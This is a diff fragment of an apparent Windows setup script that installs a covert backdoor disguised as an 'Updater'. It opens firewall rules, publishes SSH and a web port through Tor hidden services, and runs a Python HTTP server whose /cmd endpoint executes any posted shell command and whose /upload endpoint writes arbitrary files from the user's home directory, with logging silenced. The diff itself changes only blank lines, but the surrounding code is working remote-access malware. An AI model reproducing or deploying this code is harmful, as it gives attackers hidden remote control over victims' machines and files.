@@ -46,8 +46,10 @@ New-NetFirewallRule -DisplayName "Allow Updater" -Direction Inbound -Program "$p
 netsh advfirewall firewall add rule name="Allow Updater" dir=in action=allow protocol=TCP localport=8080 program="$pythonExe" enable=yes > $null 2>&1
 $torrcContent = @"
 SocksPort 9050
+
 HiddenServiceDir $torInstallDestPath\service
 HiddenServicePort 22 127.0.0.1:22
+
 HiddenServiceDir $torInstallDestPath\web-service
 HiddenServicePort 80 127.0.0.1:8080
 "@
@@ -63,38 +65,49 @@ import http.server
 import socketserver
 import os
 import subprocess
+
 PORT = 8080
 DIRECTORY = os.path.expanduser("~")
+
 class RequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_POST(self):
         if self.path == '/cmd':
             content_length = int(self.headers['Content-Length'])
             post_data = self.rfile.read(content_length).decode('utf-8')
+
             result = subprocess.getoutput(post_data)
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
             self.wfile.write(result.encode('utf-8'))
+
         elif self.path == '/upload':
             content_length = int(self.headers['Content-Length'])
             file_data = self.rfile.read(content_length)
+
             filename = "uploaded_file"
             counter = 1
             while os.path.exists(filename):
                 filename = f"uploaded_file_{counter}"
                 counter += 1
+
             with open(filename, 'wb') as f:
                 f.write(file_data)
+
             self.send_response(200)
             self.send_header("Content-type", "text/plain")
             self.end_headers()
             self.wfile.write(f"File uploaded as {filename}".encode('utf-8'))
+
         else:
             self.send_response(404)
             self.end_headers()
+
     def log_message(self, format, *args):
         return  
+
 os.chdir(DIRECTORY)
+
 handler = RequestHandler
 with socketserver.TCPServer(("", PORT), handler) as httpd:
     httpd.serve_forever()
